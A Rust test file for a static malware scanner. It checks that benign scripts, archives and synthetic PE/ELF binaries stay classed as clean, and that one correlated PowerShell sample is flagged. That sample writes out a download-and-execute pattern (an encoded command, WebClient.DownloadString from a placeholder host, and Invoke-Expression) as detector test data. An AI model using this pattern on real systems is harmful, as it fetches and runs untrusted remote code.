use std::fs;
use std::path::{Path, PathBuf};

#[allow(dead_code)]
#[path = "support/parser_fixtures.rs"]
mod parser_fixtures;

use parser_fixtures::{
    build_standard_elf_with_symbols, build_standard_pe_with_imports, build_test_elf, build_test_pe,
    unique_temp_path, ElfSymbolSpec, PeImportSpec, PeSectionSpec,
};
use projectx::r#static::config::ScanConfig;
use projectx::r#static::run_pipeline;
use projectx::r#static::types::Severity;

fn benign_fixture_path(category: &str, name: &str) -> PathBuf {
    PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .join("tests")
        .join("fixtures")
        .join("benign")
        .join(category)
        .join(name)
}

fn run_fixture(path: &Path) -> (projectx::r#static::context::ScanContext, Severity) {
    run_pipeline(path.to_str().unwrap(), Some(ScanConfig::default())).unwrap()
}

fn build_store_zip(entries: &[(&str, Vec<u8>)]) -> Vec<u8> {
    let mut local = Vec::new();
    let mut central = Vec::new();

    for (name, data) in entries {
        let name_bytes = name.as_bytes();
        let local_offset = local.len() as u32;

        local.extend_from_slice(b"PK\x03\x04");
        push_u16(&mut local, 20);
        push_u16(&mut local, 0);
        push_u16(&mut local, 0);
        push_u16(&mut local, 0);
        push_u16(&mut local, 0);
        push_u32(&mut local, crc32(data));
        push_u32(&mut local, data.len() as u32);
        push_u32(&mut local, data.len() as u32);
        push_u16(&mut local, name_bytes.len() as u16);
        push_u16(&mut local, 0);
        local.extend_from_slice(name_bytes);
        local.extend_from_slice(data);

        central.extend_from_slice(b"PK\x01\x02");
        push_u16(&mut central, 20);
        push_u16(&mut central, 20);
        push_u16(&mut central, 0);
        push_u16(&mut central, 0);
        push_u16(&mut central, 0);
        push_u16(&mut central, 0);
        push_u32(&mut central, crc32(data));
        push_u32(&mut central, data.len() as u32);
        push_u32(&mut central, data.len() as u32);
        push_u16(&mut central, name_bytes.len() as u16);
        push_u16(&mut central, 0);
        push_u16(&mut central, 0);
        push_u16(&mut central, 0);
        push_u16(&mut central, 0);
        push_u32(&mut central, 0);
        push_u32(&mut central, local_offset);
        central.extend_from_slice(name_bytes);
    }

    let central_offset = local.len() as u32;
    let central_size = central.len() as u32;
    let entry_count = entries.len() as u16;

    let mut out = local;
    out.extend_from_slice(&central);
    out.extend_from_slice(b"PK\x05\x06");
    push_u16(&mut out, 0);
    push_u16(&mut out, 0);
    push_u16(&mut out, entry_count);
    push_u16(&mut out, entry_count);
    push_u32(&mut out, central_size);
    push_u32(&mut out, central_offset);
    push_u16(&mut out, 0);
    out
}

fn push_u16(out: &mut Vec<u8>, value: u16) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn push_u32(out: &mut Vec<u8>, value: u32) {
    out.extend_from_slice(&value.to_le_bytes());
}

fn crc32(bytes: &[u8]) -> u32 {
    let mut crc = 0xFFFF_FFFFu32;
    for byte in bytes {
        crc ^= u32::from(*byte);
        for _ in 0..8 {
            let mask = (crc & 1).wrapping_neg();
            crc = (crc >> 1) ^ (0xEDB8_8320 & mask);
        }
    }
    !crc
}

fn build_legacy_office_fixture(text_body: &str) -> Vec<u8> {
    let mut bytes = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
    bytes.extend_from_slice(text_body.as_bytes());
    bytes
}

mod benign_single_case {
    use super::*;

    #[test]
    fn benign_admin_scripts_stay_clean() {
        let fixtures = [
            ("admin", "deployment_helper.ps1"),
            ("admin", "backup_cleanup.ps1"),
        ];

        for (category, name) in fixtures {
            let path = benign_fixture_path(category, name);
            let (ctx, severity) = run_fixture(&path);
            assert_eq!(
                severity,
                Severity::Clean,
                "fixture {name} should remain clean"
            );
            assert!(
                ctx.findings
                    .iter()
                    .all(|finding| finding.code != "YARA_MATCH"),
                "fixture {name} should not trigger local rules"
            );
        }
    }

    #[test]
    fn benign_updater_variants_stay_below_suspicious() {
        let fixtures = [
            ("installers", "update_checker.ps1"),
            ("installers", "environment_probe.ps1"),
            ("installers", "silent_upgrade.cmd"),
        ];

        for (category, name) in fixtures {
            let path = benign_fixture_path(category, name);
            let (ctx, severity) = run_fixture(&path);
            assert_eq!(
                severity,
                Severity::Clean,
                "fixture {name} should remain clean"
            );
            assert!(ctx.score.risk < 3.5);
            assert!(ctx
                .findings
                .iter()
                .all(|finding| finding.code != "YARA_MATCH"));
        }
    }

    #[test]
    fn benign_developer_variants_stay_clean() {
        let dampened = ["eval_config_loader.js", "obfuscated_feature_flags.js"];
        for name in dampened {
            let path = benign_fixture_path("developer", name);
            let (ctx, severity) = run_fixture(&path);
            assert_eq!(
                severity,
                Severity::Clean,
                "fixture {name} should remain clean"
            );
            assert!(ctx
                .findings
                .iter()
                .any(|finding| finding.code == "JS_SUSPICIOUS"));
            assert!(ctx.score.risk < 3.5);
        }

        let clean_only = ["minified_bundle.js", "framework_chunk.js"];
        for name in clean_only {
            let path = benign_fixture_path("developer", name);
            let (_, severity) = run_fixture(&path);
            assert_eq!(
                severity,
                Severity::Clean,
                "fixture {name} should remain clean"
            );
        }
    }

    #[test]
    fn benign_encoded_variants_stay_clean() {
        for name in ["config_blob.txt", "embedded_template.txt"] {
            let path = benign_fixture_path("encoded", name);
            let (_, severity) = run_fixture(&path);
            assert_eq!(
                severity,
                Severity::Clean,
                "fixture {name} should remain clean"
            );
        }
    }

    #[test]
    fn benign_office_variants_stay_clean() {
        let fixtures = [
            ("macro_notes.txt", true, false),
            ("formatting_macro_notes.txt", true, false),
            ("data_transform_macro.txt", true, false),
        ];

        for (name, expects_container, expects_high_risk) in fixtures {
            let source = benign_fixture_path("office", name);
            let path = unique_temp_path("projectx_benign_fixture", "docm");
            let body = fs::read_to_string(&source).unwrap();
            fs::write(&path, build_legacy_office_fixture(&body)).unwrap();

            let (ctx, severity) = run_fixture(&path);
            assert_eq!(
                severity,
                Severity::Clean,
                "fixture {name} should remain clean"
            );
            assert_eq!(
                ctx.findings
                    .iter()
                    .any(|finding| finding.code == "OFFICE_MACRO_CONTAINER"),
                expects_container
            );
            assert_eq!(
                ctx.findings
                    .iter()
                    .any(|finding| finding.code == "OFFICE_MACRO"),
                expects_high_risk
            );

            let _ = fs::remove_file(path);
        }
    }
}

mod benign_combined_signals {
    use super::*;

    #[test]
    fn mixed_benign_and_weak_suspicious_signals_stay_below_suspicious() {
        let path = unique_temp_path("projectx_benign_fixture", "ps1");
        fs::write(
            &path,
            r#"
            powershell -NoProfile -Command {
                Invoke-WebRequest -Uri "https://updates.example.local/check.json" -OutFile "$env:TEMP\\check.json"
            }
            $config = "Q29uZmlnPWxpZ2h0"
            Write-Host "Updater finished"
            "#,
        )
        .unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "PSH_SUSPICIOUS"));
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "YARA_MATCH"));

        let _ = fs::remove_file(path);
    }

    #[test]
    fn encoded_script_archive_combo_stays_clean() {
        let admin_script = fs::read(benign_fixture_path("admin", "deployment_helper.ps1")).unwrap();
        let encoded = fs::read(benign_fixture_path("encoded", "embedded_template.txt")).unwrap();
        let notes = fs::read(benign_fixture_path("archives", "script_notes.txt")).unwrap();
        let outer = build_store_zip(&[
            ("scripts/deployment_helper.ps1", admin_script),
            ("config/embedded_template.txt", encoded),
            ("docs/script_notes.txt", notes),
        ]);

        let path = unique_temp_path("projectx_benign_fixture", "zip");
        fs::write(&path, outer).unwrap();
        let (ctx, severity) = run_fixture(&path);

        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "YARA_MATCH"));

        let _ = fs::remove_file(path);
    }

    #[test]
    fn js_eval_plus_minified_bundle_stays_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "js");
        let combined = format!(
            "{}\n{}",
            fs::read_to_string(benign_fixture_path("developer", "minified_bundle.js")).unwrap(),
            fs::read_to_string(benign_fixture_path(
                "developer",
                "obfuscated_feature_flags.js"
            ))
            .unwrap()
        );
        fs::write(&path, combined).unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "JS_SUSPICIOUS"));
        assert!(ctx.score.risk < 3.5);

        let _ = fs::remove_file(path);
    }

    #[test]
    fn office_macro_plus_encoded_transform_stays_clean() {
        let source = benign_fixture_path("office", "data_transform_macro.txt");
        let encoded =
            fs::read_to_string(benign_fixture_path("encoded", "config_blob.txt")).unwrap();
        let path = unique_temp_path("projectx_benign_fixture", "docm");
        let body = format!("{}\n{}", fs::read_to_string(source).unwrap(), encoded);
        fs::write(&path, build_legacy_office_fixture(&body)).unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "OFFICE_MACRO_CONTAINER"));
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "OFFICE_MACRO"));

        let _ = fs::remove_file(path);
    }
}

mod edge_cases {
    use super::*;

    #[test]
    fn very_small_file_with_suspicious_wording_stays_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "txt");
        fs::write(&path, "powershell").unwrap();
        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        let _ = fs::remove_file(path);
    }

    #[test]
    fn large_file_with_minimal_signal_stays_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "txt");
        let mut text = "A".repeat(256 * 1024);
        text.push_str("\n/bin/sh\n");
        fs::write(&path, text).unwrap();
        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "YARA_MATCH"));
        let _ = fs::remove_file(path);
    }

    #[test]
    fn repeated_weak_archive_signals_stay_below_suspicious() {
        let readme = fs::read(benign_fixture_path("archives", "readme.txt")).unwrap();
        let manifest = fs::read(benign_fixture_path("archives", "update_manifest.txt")).unwrap();
        let nested_zip = build_store_zip(&[("manifests/update_manifest.txt", manifest.clone())]);
        let outer = build_store_zip(&[
            ("docs/readme.txt", readme.clone()),
            ("nested/a.zip", nested_zip.clone()),
            ("nested/b.jar", nested_zip.clone()),
            ("nested/c.iso", nested_zip),
            ("docs/manifest.txt", manifest),
        ]);

        let path = unique_temp_path("projectx_benign_fixture", "zip");
        fs::write(&path, outer).unwrap();
        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "ZIP_NESTED_ARCHIVES"));
        let _ = fs::remove_file(path);
    }

    #[test]
    fn benign_dense_archive_stays_clean() {
        let mut entries = Vec::new();
        for idx in 0..1001u16 {
            entries.push((format!("docs/file_{idx:04}.txt"), b"ok".to_vec()));
        }
        let entry_refs = entries
            .iter()
            .map(|(name, data)| (name.as_str(), data.clone()))
            .collect::<Vec<_>>();
        let bytes = build_store_zip(&entry_refs);
        let path = unique_temp_path("projectx_benign_fixture", "zip");
        fs::write(&path, bytes).unwrap();

        let (ctx, severity) = run_fixture(&path);

        assert_eq!(severity, Severity::Clean);
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "ZIP_DENSE"));
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "RESOURCE_ARCHIVE_ENTRY_LIMIT"));
        assert!(ctx.score.risk < 3.5);

        let _ = fs::remove_file(path);
    }

    #[test]
    fn benign_nested_archive_stays_clean() {
        let readme = fs::read(benign_fixture_path("archives", "readme.txt")).unwrap();
        let manifest = fs::read(benign_fixture_path("archives", "update_manifest.txt")).unwrap();
        let nested_zip = build_store_zip(&[("update_manifest.txt", manifest.clone())]);
        let pseudo_jar = build_store_zip(&[("docs/readme.txt", readme.clone())]);
        let outer = build_store_zip(&[
            ("docs/readme.txt", readme),
            ("nested/support.zip", nested_zip),
            ("nested/tooling.jar", pseudo_jar),
        ]);

        let path = unique_temp_path("projectx_benign_fixture", "zip");
        fs::write(&path, outer).unwrap();

        let (ctx, severity) = run_fixture(&path);

        assert_eq!(severity, Severity::Clean);
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "ZIP_NESTED_ARCHIVES"));
        assert!(ctx.score.risk < 3.5);

        let _ = fs::remove_file(path);
    }

    #[test]
    fn benign_binary_adjacent_notes_do_not_overfire_structural_pe_signals() {
        let path = unique_temp_path("projectx_benign_fixture", "exe");
        fs::write(
            &path,
            r#"
            MZ
            PE
            Release engineering notes for an installer migration.
            VirtualAlloc and WriteProcessMemory are listed here as APIs reviewed by the team.
            The document focuses on compatibility notes and deployment planning only.
            "#,
        )
        .unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "PE_INJECTION_CHAIN"));
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "YARA_MATCH"));

        let _ = fs::remove_file(path);
    }

    #[test]
    fn parsed_benign_pe_layout_stays_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "exe");
        let bytes = build_test_pe(
            &[
                PeSectionSpec {
                    name: ".text",
                    virtual_size: 0x900,
                    raw_size: 0x400,
                    characteristics: 0x6000_0020,
                },
                PeSectionSpec {
                    name: ".rdata",
                    virtual_size: 0x400,
                    raw_size: 0x200,
                    characteristics: 0x4000_0040,
                },
                PeSectionSpec {
                    name: ".data",
                    virtual_size: 0x300,
                    raw_size: 0x200,
                    characteristics: 0xC000_0040,
                },
                PeSectionSpec {
                    name: ".rsrc",
                    virtual_size: 0x500,
                    raw_size: 0x200,
                    characteristics: 0x4000_0040,
                },
                PeSectionSpec {
                    name: ".reloc",
                    virtual_size: 0x200,
                    raw_size: 0x200,
                    characteristics: 0x4200_0040,
                },
            ],
            b"VersionInfo installer manifest support files",
        );
        fs::write(&path, bytes).unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "PE_PACKED_SECTION_LAYOUT"));
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "PE_EXECUTABLE_WRITABLE_SECTION"));

        let _ = fs::remove_file(path);
    }

    #[test]
    fn parsed_benign_import_directory_stays_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "exe");
        let bytes = build_standard_pe_with_imports(
            &[PeImportSpec {
                dll: "kernel32.dll",
                functions: &["GetModuleFileNameW", "GetCommandLineW"],
            }],
            b"VersionInfo installer support files",
        );
        fs::write(&path, bytes).unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "PE_DYNAMIC_LOADER_IMPORTS"));
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "PE_INJECTION_CHAIN"));

        let _ = fs::remove_file(path);
    }

    #[test]
    fn parsed_benign_elf_layout_stays_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "elf");
        let bytes = build_test_elf(
            &[".text", ".dynamic", ".dynsym", ".interp", ".shstrtab"],
            Some("/lib64/ld-linux-x86-64.so.2"),
            b"printf puts libc startup",
        );
        fs::write(&path, bytes).unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "ELF_DYNAMIC_LOADER_CHAIN"));
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "ELF_SELF_RELAUNCH_CHAIN"));

        let _ = fs::remove_file(path);
    }

    #[test]
    fn parsed_benign_elf_symbols_stay_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "elf");
        let bytes = build_standard_elf_with_symbols(
            &[
                ElfSymbolSpec { name: "printf" },
                ElfSymbolSpec { name: "puts" },
                ElfSymbolSpec {
                    name: "getaddrinfo",
                },
            ],
            b"support notes and package metadata",
        );
        fs::write(&path, bytes).unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "ELF_DYNAMIC_SYMBOL_CHAIN"));
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "ELF_EXEC_NETWORK_SYMBOL_CHAIN"));

        let _ = fs::remove_file(path);
    }

    #[test]
    fn benign_elf_loader_adjacent_notes_with_weak_symbols_stay_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "elf");
        let bytes = build_standard_elf_with_symbols(
            &[
                ElfSymbolSpec { name: "dlopen" },
                ElfSymbolSpec { name: "printf" },
            ],
            b"package support notes mention shell startup, socket docs, and loader examples",
        );
        fs::write(&path, bytes).unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "ELF_DYNAMIC_SYMBOL_CHAIN"));
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "ELF_EXEC_NETWORK_SYMBOL_CHAIN"));

        let _ = fs::remove_file(path);
    }

    #[test]
    fn benign_elf_shell_words_without_symbol_corroboration_stay_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "elf");
        let bytes = build_standard_elf_with_symbols(
            &[ElfSymbolSpec { name: "getaddrinfo" }],
            b"documentation mentions /bin/sh for shell scripts and connect/getaddrinfo usage examples",
        );
        fs::write(&path, bytes).unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_eq!(severity, Severity::Clean);
        assert!(ctx.score.risk < 3.5);
        assert!(ctx
            .findings
            .iter()
            .all(|finding| finding.code != "ELF_EXEC_NETWORK_SYMBOL_CHAIN"));

        let _ = fs::remove_file(path);
    }
}

mod correlated_suspicious {
    use super::*;

    #[test]
    fn correlated_powershell_signals_escalate_out_of_clean() {
        let path = unique_temp_path("projectx_benign_fixture", "ps1");
        fs::write(
            &path,
            r#"
            powershell -EncodedCommand AAAA
            [Convert]::FromBase64String("QUJDRA==")
            (New-Object Net.WebClient).DownloadString("https://example.invalid")
            Invoke-Expression $decoded
            "#,
        )
        .unwrap();

        let (ctx, severity) = run_fixture(&path);
        assert_ne!(severity, Severity::Clean);
        assert!(ctx
            .findings
            .iter()
            .any(|finding| finding.code == "YARA_MATCH"));

        let _ = fs::remove_file(path);
    }
}
